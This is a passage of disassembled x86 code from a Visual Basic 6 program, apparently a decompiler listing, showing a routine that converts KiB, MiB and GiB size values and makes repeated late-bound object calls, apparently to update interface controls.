0086807F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00868084: mov var_00000204, eax
0086808A: jmp 868093h
0086808C: and var_00000204, 00000000h
00868093: push var_38
00868096: call 004109DCh ; Val(arg_1)
0086809B: fstp real8 ptr var_30
0086809E: lea ecx, var_38
008680A1: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008680A6: lea ecx, var_40
008680A9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008680AE: jmp 0086831Bh
008680B3: push var_000001A4
008680B9: push 00455EECh ; KiB
008680BE: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008680C3: test eax, eax
008680C5: jnz 0086816Ch
008680CB: mov eax, [ebp+08h]
008680CE: mov eax, [eax]
008680D0: push [ebp+08h]
008680D3: call [eax+00000304h]
008680D9: push eax
008680DA: lea eax, var_40
008680DD: push eax
008680DE: call 00410A84h ; Set (object)
008680E3: mov var_0000019C, eax
008680E9: lea eax, var_38
008680EC: push eax
008680ED: mov eax, var_0000019C
008680F3: mov eax, [eax]
008680F5: push var_0000019C
008680FB: call [eax+000000A0h]
00868101: fclex 
00868103: mov var_000001A0, eax
00868109: cmp var_000001A0, 00000000h
00868110: jnl 868135h
00868112: push 000000A0h
00868117: push 00440E08h
0086811C: push var_0000019C
00868122: push var_000001A0
00868128: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086812D: mov var_00000208, eax
00868133: jmp 86813Ch
00868135: and var_00000208, 00000000h
0086813C: push var_38
0086813F: call 004109DCh ; Val(arg_1)
00868144: fmul real8 ptr [00404D48h]
0086814A: fstp real8 ptr var_30
0086814D: fstsw ax
0086814F: test al, 0Dh
00868151: jnz 0086AEC6h
00868157: lea ecx, var_38
0086815A: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0086815F: lea ecx, var_40
00868162: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00868167: jmp 0086831Bh
0086816C: push var_000001A4
00868172: push 00455EF8h ; MiB
00868177: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0086817C: test eax, eax
0086817E: jnz 00868246h
00868184: mov eax, [ebp+08h]
00868187: mov eax, [eax]
00868189: push [ebp+08h]
0086818C: call [eax+00000304h]
00868192: push eax
00868193: lea eax, var_40
00868196: push eax
00868197: call 00410A84h ; Set (object)
0086819C: mov var_0000019C, eax
008681A2: lea eax, var_38
008681A5: push eax
008681A6: mov eax, var_0000019C
008681AC: mov eax, [eax]
008681AE: push var_0000019C
008681B4: call [eax+000000A0h]
008681BA: fclex 
008681BC: mov var_000001A0, eax
008681C2: cmp var_000001A0, 00000000h
008681C9: jnl 8681EEh
008681CB: push 000000A0h
008681D0: push 00440E08h
008681D5: push var_0000019C
008681DB: push var_000001A0
008681E1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008681E6: mov var_0000020C, eax
008681EC: jmp 8681F5h
008681EE: and var_0000020C, 00000000h
008681F5: push var_38
008681F8: call 004109DCh ; Val(arg_1)
008681FD: fstp real8 ptr var_00000214
00868203: fld real8 ptr [00401758h]
00868209: push ecx
0086820A: push ecx
0086820B: fstp real8 ptr [esp]
0086820E: fld real8 ptr [00404D48h]
00868214: push ecx
00868215: push ecx
00868216: fstp real8 ptr [esp]
00868219: call 00410B0Eh ; msvbvm60.dll.__vbaPowerR8
0086821E: fmul real8 ptr var_00000214
00868224: fstp real8 ptr var_30
00868227: fstsw ax
00868229: test al, 0Dh
0086822B: jnz 0086AEC6h
00868231: lea ecx, var_38
00868234: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00868239: lea ecx, var_40
0086823C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00868241: jmp 0086831Bh
00868246: push var_000001A4
0086824C: push 00455F04h ; GiB
00868251: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00868256: test eax, eax
00868258: jnz 0086831Bh
0086825E: mov eax, [ebp+08h]
00868261: mov eax, [eax]
00868263: push [ebp+08h]
00868266: call [eax+00000304h]
0086826C: push eax
0086826D: lea eax, var_40
00868270: push eax
00868271: call 00410A84h ; Set (object)
00868276: mov var_0000019C, eax
0086827C: lea eax, var_38
0086827F: push eax
00868280: mov eax, var_0000019C
00868286: mov eax, [eax]
00868288: push var_0000019C
0086828E: call [eax+000000A0h]
00868294: fclex 
00868296: mov var_000001A0, eax
0086829C: cmp var_000001A0, 00000000h
008682A3: jnl 8682C8h
008682A5: push 000000A0h
008682AA: push 00440E08h
008682AF: push var_0000019C
008682B5: push var_000001A0
008682BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008682C0: mov var_00000218, eax
008682C6: jmp 8682CFh
008682C8: and var_00000218, 00000000h
008682CF: push var_38
008682D2: call 004109DCh ; Val(arg_1)
008682D7: fstp real8 ptr var_00000220
008682DD: fld real8 ptr [00405830h]
008682E3: push ecx
008682E4: push ecx
008682E5: fstp real8 ptr [esp]
008682E8: fld real8 ptr [00404D48h]
008682EE: push ecx
008682EF: push ecx
008682F0: fstp real8 ptr [esp]
008682F3: call 00410B0Eh ; msvbvm60.dll.__vbaPowerR8
008682F8: fmul real8 ptr var_00000220
008682FE: fstp real8 ptr var_30
00868301: fstsw ax
00868303: test al, 0Dh
00868305: jnz 0086AEC6h
0086830B: lea ecx, var_38
0086830E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00868313: lea ecx, var_40
00868316: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086831B: push 00000000h
0086831D: push 8001000Dh
00868322: mov eax, [ebp+08h]
00868325: mov eax, [eax]
00868327: push [ebp+08h]
0086832A: call [eax+0000032Ch]
00868330: push eax
00868331: lea eax, var_40
00868334: push eax
00868335: call 00410A84h ; Set (object)
0086833A: push eax
0086833B: lea eax, var_6C
0086833E: push eax
0086833F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868344: add esp, 00000010h
00868347: push eax
00868348: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0086834D: sub ax, FFFFh
00868351: neg ax
00868354: sbb eax, eax
00868356: inc eax
00868357: neg eax
00868359: mov var_0000019C, ax
00868360: lea ecx, var_40
00868363: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00868368: lea ecx, var_6C
0086836B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00868370: movsx eax, word ptr var_0000019C
00868377: test eax, eax
00868379: jz 8683C9h
0086837B: push 00000000h
0086837D: push 00000000h
0086837F: mov eax, [ebp+08h]
00868382: mov eax, [eax]
00868384: push [ebp+08h]
00868387: call [eax+0000032Ch]
0086838D: push eax
0086838E: lea eax, var_40
00868391: push eax
00868392: call 00410A84h ; Set (object)
00868397: push eax
00868398: lea eax, var_6C
0086839B: push eax
0086839C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008683A1: add esp, 00000010h
008683A4: push eax
008683A5: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008683AA: mov edx, eax
008683AC: lea ecx, var_28
008683AF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008683B4: lea ecx, var_40
008683B7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008683BC: lea ecx, var_6C
008683BF: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008683C4: jmp 00868457h
008683C9: mov eax, [ebp+08h]
008683CC: mov eax, [eax]
008683CE: push [ebp+08h]
008683D1: call [eax+00000314h]
008683D7: push eax
008683D8: lea eax, var_40
008683DB: push eax
008683DC: call 00410A84h ; Set (object)
008683E1: mov var_0000019C, eax
008683E7: lea eax, var_38
008683EA: push eax
008683EB: mov eax, var_0000019C
008683F1: mov eax, [eax]
008683F3: push var_0000019C
008683F9: call [eax+50h]
008683FC: fclex 
008683FE: mov var_000001A0, eax
00868404: cmp var_000001A0, 00000000h
0086840B: jnl 86842Dh
0086840D: push 00000050h
0086840F: push 004425E4h
00868414: push var_0000019C
0086841A: push var_000001A0
00868420: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00868425: mov var_00000224, eax
0086842B: jmp 868434h
0086842D: and var_00000224, 00000000h
00868434: mov eax, var_38
00868437: mov var_000001F8, eax
0086843D: and var_38, 00000000h
00868441: mov edx, var_000001F8
00868447: lea ecx, var_28
0086844A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086844F: lea ecx, var_40
00868452: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00868457: push 00000000h
00868459: push 00000003h
0086845B: push 00440E48h
00868460: push 00000000h
00868462: push 00000018h
00868464: mov eax, [ebp+08h]
00868467: mov eax, [eax]
00868469: push [ebp+08h]
0086846C: call [eax+00000320h]
00868472: push eax
00868473: lea eax, var_40
00868476: push eax
00868477: call 00410A84h ; Set (object)
0086847C: push eax
0086847D: lea eax, var_6C
00868480: push eax
00868481: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868486: add esp, 00000010h
00868489: push eax
0086848A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086848F: push eax
00868490: lea eax, var_44
00868493: push eax
00868494: call 00410A84h ; Set (object)
00868499: push eax
0086849A: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086849F: add esp, 0000000Ch
008684A2: lea eax, var_44
008684A5: push eax
008684A6: lea eax, var_40
008684A9: push eax
008684AA: push 00000002h
008684AC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008684B1: add esp, 0000000Ch
008684B4: lea ecx, var_6C
008684B7: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008684BC: cmp word ptr [008F2430h], FFFFh
008684C4: jnz 00869937h
008684CA: mov var_00000118, 00000001h
008684D4: mov var_00000120, 00000002h
008684DE: cmp [008F2010h], 00000000h
008684E5: jnz 868502h
008684E7: push 008F2010h
008684EC: push 00433984h
008684F1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008684F6: mov var_00000228, 008F2010h
00868500: jmp 86850Ch
00868502: mov var_00000228, 008F2010h
0086850C: push 00000000h
0086850E: push 00000001h
00868510: push 00440E48h
00868515: push 00000000h
00868517: push 00000018h
00868519: mov eax, var_00000228
0086851F: mov eax, [eax]
00868521: mov ecx, var_00000228
00868527: mov ecx, [ecx]
00868529: mov ecx, [ecx]
0086852B: push eax
0086852C: call [ecx+0000054Ch]
00868532: push eax
00868533: lea eax, var_40
00868536: push eax
00868537: call 00410A84h ; Set (object)
0086853C: push eax
0086853D: lea eax, var_6C
00868540: push eax
00868541: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868546: add esp, 00000010h
00868549: push eax
0086854A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086854F: push eax
00868550: lea eax, var_44
00868553: push eax
00868554: call 00410A84h ; Set (object)
00868559: push eax
0086855A: lea eax, var_7C
0086855D: push eax
0086855E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868563: add esp, 00000010h
00868566: push eax
00868567: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086856C: mov var_00000128, eax
00868572: mov var_00000130, 00000003h
0086857C: mov var_00000138, 00000001h
00868586: mov var_00000140, 00000002h
00868590: lea eax, var_00000120
00868596: push eax
00868597: lea eax, var_00000130
0086859D: push eax
0086859E: lea eax, var_00000140
008685A4: push eax
008685A5: lea eax, var_000001CC
008685AB: push eax
008685AC: lea eax, var_000001BC
008685B2: push eax
008685B3: lea eax, var_24
008685B6: push eax
008685B7: call 00410A3Ch ; For
008685BC: mov var_000001FC, eax
008685C2: lea eax, var_44
008685C5: push eax
008685C6: lea eax, var_40
008685C9: push eax
008685CA: push 00000002h
008685CC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008685D1: add esp, 0000000Ch
008685D4: lea eax, var_7C
008685D7: push eax
008685D8: lea eax, var_6C
008685DB: push eax
008685DC: push 00000002h
008685DE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008685E3: add esp, 0000000Ch
008685E6: jmp 00869925h
008685EB: lea eax, var_24
008685EE: mov var_00000118, eax
008685F4: mov var_00000120, 0000400Ch
008685FE: cmp [008F2010h], 00000000h
00868605: jnz 868622h
00868607: push 008F2010h
0086860C: push 00433984h
00868611: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868616: mov var_0000022C, 008F2010h
00868620: jmp 86862Ch
00868622: mov var_0000022C, 008F2010h
0086862C: push 00000000h
0086862E: push 00000004h
00868630: push 00440E58h
00868635: push 00000010h
00868637: pop eax
00868638: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086863D: lea esi, var_00000120
00868643: mov edi, esp
00868645: movsd 
00868646: movsd 
00868647: movsd 
00868648: movsd 
00868649: push 00000001h
0086864B: push 00000000h
0086864D: push 00440E48h
00868652: push 00000000h
00868654: push 00000018h
00868656: mov eax, var_0000022C
0086865C: mov eax, [eax]
0086865E: mov ecx, var_0000022C
00868664: mov ecx, [ecx]
00868666: mov ecx, [ecx]
00868668: push eax
00868669: call [ecx+0000054Ch]
0086866F: push eax
00868670: lea eax, var_40
00868673: push eax
00868674: call 00410A84h ; Set (object)
00868679: push eax
0086867A: lea eax, var_6C
0086867D: push eax
0086867E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868683: add esp, 00000010h
00868686: push eax
00868687: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086868C: push eax
0086868D: lea eax, var_44
00868690: push eax
00868691: call 00410A84h ; Set (object)
00868696: push eax
00868697: lea eax, var_7C
0086869A: push eax
0086869B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008686A0: add esp, 00000020h
008686A3: push eax
008686A4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008686A9: push eax
008686AA: lea eax, var_48
008686AD: push eax
008686AE: call 00410A84h ; Set (object)
008686B3: push eax
008686B4: lea eax, var_0000008C
008686BA: push eax
008686BB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008686C0: add esp, 00000010h
008686C3: push eax
008686C4: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008686C9: sub ax, FFFFh
008686CD: neg ax
008686D0: sbb eax, eax
008686D2: inc eax
008686D3: neg eax
008686D5: mov var_0000019C, ax
008686DC: lea eax, var_48
008686DF: push eax
008686E0: lea eax, var_44
008686E3: push eax
008686E4: lea eax, var_40
008686E7: push eax
008686E8: push 00000003h
008686EA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008686EF: add esp, 00000010h
008686F2: lea eax, var_0000008C
008686F8: push eax
008686F9: lea eax, var_7C
008686FC: push eax
008686FD: lea eax, var_6C
00868700: push eax
00868701: push 00000003h
00868703: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00868708: add esp, 00000010h
0086870B: movsx eax, word ptr var_0000019C
00868712: test eax, eax
00868714: jz 00869908h
0086871A: mov eax, [ebp+08h]
0086871D: mov eax, [eax]
0086871F: push [ebp+08h]
00868722: call [eax+00000320h]
00868728: push eax
00868729: lea eax, var_000001A8
0086872F: push eax
00868730: call 00410A84h ; Set (object)
00868735: mov var_00000138, 80020004h
0086873F: mov var_00000140, 0000000Ah
00868749: lea eax, var_24
0086874C: mov var_00000118, eax
00868752: mov var_00000120, 0000400Ch
0086875C: cmp [008F2010h], 00000000h
00868763: jnz 868780h
00868765: push 008F2010h
0086876A: push 00433984h
0086876F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868774: mov var_00000230, 008F2010h
0086877E: jmp 86878Ah
00868780: mov var_00000230, 008F2010h
0086878A: push 00000000h
0086878C: push 00000014h
0086878E: push 00440E58h
00868793: push 00000010h
00868795: pop eax
00868796: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086879B: lea esi, var_00000120
008687A1: mov edi, esp
008687A3: movsd 
008687A4: movsd 
008687A5: movsd 
008687A6: movsd 
008687A7: push 00000001h
008687A9: push 00000000h
008687AB: push 00440E48h
008687B0: push 00000000h
008687B2: push 00000018h
008687B4: mov eax, var_00000230
008687BA: mov eax, [eax]
008687BC: mov ecx, var_00000230
008687C2: mov ecx, [ecx]
008687C4: mov ecx, [ecx]
008687C6: push eax
008687C7: call [ecx+0000054Ch]
008687CD: push eax
008687CE: lea eax, var_40
008687D1: push eax
008687D2: call 00410A84h ; Set (object)
008687D7: push eax
008687D8: lea eax, var_6C
008687DB: push eax
008687DC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008687E1: add esp, 00000010h
008687E4: push eax
008687E5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008687EA: push eax
008687EB: lea eax, var_44
008687EE: push eax
008687EF: call 00410A84h ; Set (object)
008687F4: push eax
008687F5: lea eax, var_7C
008687F8: push eax
008687F9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008687FE: add esp, 00000020h
00868801: push eax
00868802: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868807: push eax
00868808: lea eax, var_48
0086880B: push eax
0086880C: call 00410A84h ; Set (object)
00868811: push eax
00868812: lea eax, var_0000008C
00868818: push eax
00868819: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086881E: add esp, 00000010h
00868821: push eax
00868822: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00868827: mov var_000000D4, eax
0086882D: mov var_000000DC, 00000008h
00868837: lea eax, var_24
0086883A: mov var_00000128, eax
00868840: mov var_00000130, 0000400Ch
0086884A: cmp [008F2010h], 00000000h
00868851: jnz 86886Eh
00868853: push 008F2010h
00868858: push 00433984h
0086885D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868862: mov var_00000234, 008F2010h
0086886C: jmp 868878h
0086886E: mov var_00000234, 008F2010h
00868878: push 00000000h
0086887A: push 00000000h
0086887C: push 00440E58h
00868881: push 00000010h
00868883: pop eax
00868884: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868889: lea esi, var_00000130
0086888F: mov edi, esp
00868891: movsd 
00868892: movsd 
00868893: movsd 
00868894: movsd 
00868895: push 00000001h
00868897: push 00000000h
00868899: push 00440E48h
0086889E: push 00000000h
008688A0: push 00000018h
008688A2: mov eax, var_00000234
008688A8: mov eax, [eax]
008688AA: mov ecx, var_00000234
008688B0: mov ecx, [ecx]
008688B2: mov ecx, [ecx]
008688B4: push eax
008688B5: call [ecx+0000054Ch]
008688BB: push eax
008688BC: lea eax, var_4C
008688BF: push eax
008688C0: call 00410A84h ; Set (object)
008688C5: push eax
008688C6: lea eax, var_0000009C
008688CC: push eax
008688CD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008688D2: add esp, 00000010h
008688D5: push eax
008688D6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008688DB: push eax
008688DC: lea eax, var_50
008688DF: push eax
008688E0: call 00410A84h ; Set (object)
008688E5: push eax
008688E6: lea eax, var_000000AC
008688EC: push eax
008688ED: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008688F2: add esp, 00000020h
008688F5: push eax
008688F6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008688FB: push eax
008688FC: lea eax, var_54
008688FF: push eax
00868900: call 00410A84h ; Set (object)
00868905: push eax
00868906: lea eax, var_000000BC
0086890C: push eax
0086890D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868912: add esp, 00000010h
00868915: push eax
00868916: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086891B: mov var_000000E4, eax
00868921: mov var_000000EC, 00000008h
0086892B: push 00000010h
0086892D: pop eax
0086892E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868933: lea esi, var_00000140
00868939: mov edi, esp
0086893B: movsd 
0086893C: movsd 
0086893D: movsd 
0086893E: movsd 
0086893F: push 00000010h
00868941: pop eax
00868942: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868947: lea esi, var_000000DC
0086894D: mov edi, esp
0086894F: movsd 
00868950: movsd 
00868951: movsd 
00868952: movsd 
00868953: push 00000010h
00868955: pop eax
00868956: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086895B: lea esi, var_000000EC
00868961: mov edi, esp
00868963: movsd 
00868964: movsd 
00868965: movsd 
00868966: movsd 
00868967: push 00000003h
00868969: push 00000002h
0086896B: push 00440E48h
00868970: push 00000000h
00868972: push 00000018h
00868974: push var_000001A8
0086897A: lea eax, var_000000CC
00868980: push eax
00868981: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868986: add esp, 00000010h
00868989: push eax
0086898A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086898F: push eax
00868990: lea eax, var_58
00868993: push eax
00868994: call 00410A84h ; Set (object)
00868999: push eax
0086899A: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086899F: add esp, 0000003Ch
008689A2: lea eax, var_58
008689A5: push eax
008689A6: lea eax, var_54
008689A9: push eax
008689AA: lea eax, var_50
008689AD: push eax
008689AE: lea eax, var_4C
008689B1: push eax
008689B2: lea eax, var_48
008689B5: push eax
008689B6: lea eax, var_44
008689B9: push eax
008689BA: lea eax, var_40
008689BD: push eax
008689BE: push 00000007h
008689C0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008689C5: add esp, 00000020h
008689C8: lea eax, var_000000EC
008689CE: push eax
008689CF: lea eax, var_000000DC
008689D5: push eax
008689D6: lea eax, var_000000CC
008689DC: push eax
008689DD: lea eax, var_000000BC
008689E3: push eax
008689E4: lea eax, var_000000AC
008689EA: push eax
008689EB: lea eax, var_0000009C
008689F1: push eax
008689F2: lea eax, var_0000008C
008689F8: push eax
008689F9: lea eax, var_7C
008689FC: push eax
008689FD: lea eax, var_6C
00868A00: push eax
00868A01: push 00000009h
00868A03: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00868A08: add esp, 00000028h
00868A0B: mov var_00000168, 00000001h
00868A15: mov var_00000170, 00000003h
00868A1F: mov var_00000128, 00000001h
00868A29: mov var_00000130, 00000003h
00868A33: lea eax, var_24
00868A36: mov var_00000118, eax
00868A3C: mov var_00000120, 0000400Ch
00868A46: cmp [008F2010h], 00000000h
00868A4D: jnz 868A6Ah
00868A4F: push 008F2010h
00868A54: push 00433984h
00868A59: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868A5E: mov var_00000238, 008F2010h
00868A68: jmp 868A74h
00868A6A: mov var_00000238, 008F2010h
00868A74: push 00000010h
00868A76: pop eax
00868A77: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868A7C: lea esi, var_00000130
00868A82: mov edi, esp
00868A84: movsd 
00868A85: movsd 
00868A86: movsd 
00868A87: movsd 
00868A88: push 00000001h
00868A8A: push 00000010h
00868A8C: push 00440E58h
00868A91: push 00000010h
00868A93: pop eax
00868A94: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868A99: lea esi, var_00000120
00868A9F: mov edi, esp
00868AA1: movsd 
00868AA2: movsd 
00868AA3: movsd 
00868AA4: movsd 
00868AA5: push 00000001h
00868AA7: push 00000000h
00868AA9: push 00440E48h
00868AAE: push 00000000h
00868AB0: push 00000018h
00868AB2: mov eax, var_00000238
00868AB8: mov eax, [eax]
00868ABA: mov ecx, var_00000238
00868AC0: mov ecx, [ecx]
00868AC2: mov ecx, [ecx]
00868AC4: push eax
00868AC5: call [ecx+0000054Ch]
00868ACB: push eax
00868ACC: lea eax, var_40
00868ACF: push eax
00868AD0: call 00410A84h ; Set (object)
00868AD5: push eax
00868AD6: lea eax, var_6C
00868AD9: push eax
00868ADA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868ADF: add esp, 00000010h
00868AE2: push eax
00868AE3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868AE8: push eax
00868AE9: lea eax, var_44
00868AEC: push eax
00868AED: call 00410A84h ; Set (object)
00868AF2: push eax
00868AF3: lea eax, var_7C
00868AF6: push eax
00868AF7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868AFC: add esp, 00000020h
00868AFF: push eax
00868B00: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868B05: push eax
00868B06: lea eax, var_48
00868B09: push eax
00868B0A: call 00410A84h ; Set (object)
00868B0F: push eax
00868B10: lea eax, var_0000008C
00868B16: push eax
00868B17: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868B1C: add esp, 00000020h
00868B1F: push eax
00868B20: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00868B25: mov var_000000F4, eax
00868B2B: mov var_000000FC, 00000008h
00868B35: lea eax, var_24
00868B38: mov var_00000148, eax
00868B3E: mov var_00000150, 0000400Ch
00868B48: cmp [008F2010h], 00000000h
00868B4F: jnz 868B6Ch
00868B51: push 008F2010h
00868B56: push 00433984h
00868B5B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00868B60: mov var_0000023C, 008F2010h
00868B6A: jmp 868B76h
00868B6C: mov var_0000023C, 008F2010h
00868B76: push 00000000h
00868B78: push 00000014h
00868B7A: push 00440E58h
00868B7F: push 00000010h
00868B81: pop eax
00868B82: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868B87: lea esi, var_00000150
00868B8D: mov edi, esp
00868B8F: movsd 
00868B90: movsd 
00868B91: movsd 
00868B92: movsd 
00868B93: push 00000001h
00868B95: push 00000000h
00868B97: push 00440E48h
00868B9C: push 00000000h
00868B9E: push 00000018h
00868BA0: mov eax, var_0000023C
00868BA6: mov eax, [eax]
00868BA8: mov ecx, var_0000023C
00868BAE: mov ecx, [ecx]
00868BB0: mov ecx, [ecx]
00868BB2: push eax
00868BB3: call [ecx+0000054Ch]
00868BB9: push eax
00868BBA: lea eax, var_4C
00868BBD: push eax
00868BBE: call 00410A84h ; Set (object)
00868BC3: push eax
00868BC4: lea eax, var_0000009C
00868BCA: push eax
00868BCB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868BD0: add esp, 00000010h
00868BD3: push eax
00868BD4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868BD9: push eax
00868BDA: lea eax, var_50
00868BDD: push eax
00868BDE: call 00410A84h ; Set (object)
00868BE3: push eax
00868BE4: lea eax, var_000000AC
00868BEA: push eax
00868BEB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868BF0: add esp, 00000020h
00868BF3: push eax
00868BF4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868BF9: push eax
00868BFA: lea eax, var_54
00868BFD: push eax
00868BFE: call 00410A84h ; Set (object)
00868C03: push eax
00868C04: lea eax, var_000000BC
00868C0A: push eax
00868C0B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868C10: add esp, 00000010h
00868C13: push eax
00868C14: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00868C19: mov var_000000D4, eax
00868C1F: mov var_000000DC, 00000008h
00868C29: push 00000010h
00868C2B: pop eax
00868C2C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868C31: lea esi, var_00000170
00868C37: mov edi, esp
00868C39: movsd 
00868C3A: movsd 
00868C3B: movsd 
00868C3C: movsd 
00868C3D: push 00000010h
00868C3F: pop eax
00868C40: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868C45: lea esi, var_000000FC
00868C4B: mov edi, esp
00868C4D: movsd 
00868C4E: movsd 
00868C4F: movsd 
00868C50: movsd 
00868C51: push 00000001h
00868C53: push 00000010h
00868C55: push 00440E58h
00868C5A: push 00000010h
00868C5C: pop eax
00868C5D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00868C62: lea esi, var_000000DC
00868C68: mov edi, esp
00868C6A: movsd 
00868C6B: movsd 
00868C6C: movsd 
00868C6D: movsd 
00868C6E: push 00000001h
00868C70: push 00000000h
00868C72: push 00440E48h
00868C77: push 00000000h
00868C79: push 00000018h
00868C7B: push var_000001A8
00868C81: lea eax, var_000000CC
00868C87: push eax
00868C88: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868C8D: add esp, 00000010h
00868C90: push eax
00868C91: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868C96: push eax
00868C97: lea eax, var_58
00868C9A: push eax
00868C9B: call 00410A84h ; Set (object)
00868CA0: push eax
00868CA1: lea eax, var_000000EC
00868CA7: push eax
00868CA8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00868CAD: add esp, 00000020h
00868CB0: push eax
00868CB1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00868CB6: push eax
00868CB7: lea eax, var_5C
00868CBA: push eax
00868CBB: call 00410A84h ; Set (object)
00868CC0: push eax
00868CC1: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
00868CC6: add esp, 0000002Ch
00868CC9: lea eax, var_5C
00868CCC: push eax
00868CCD: lea eax, var_58
00868CD0: push eax
00868CD1: lea eax, var_54
00868CD4: push eax
00868CD5: lea eax, var_50
00868CD8: push eax
00868CD9: lea eax, var_4C
00868CDC: push eax
00868CDD: lea eax, var_48
00868CE0: push eax
00868CE1: lea eax, var_44
00868CE4: push eax
00868CE5: lea eax, var_40
00868CE8: push eax
00868CE9: push 00000008h
00868CEB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00868CF0: add esp, 00000024h
00868CF3: lea eax, var_000000FC
00868CF9: push eax
00868CFA: lea eax, var_000000EC
00868D00: push eax
00868D01: lea eax, var_000000DC
00868D07: push eax
00868D08: lea eax, var_000000CC
00868D0E: push eax
00868D0F: lea eax, var_000000BC
00868D15: push eax
00868D16: lea eax, var_000000AC
00868D1C: push eax
00868D1D: lea eax, var_0000009C
00868D23: push eax
00868D24: lea eax, var_0000008C
00868D2A: push eax
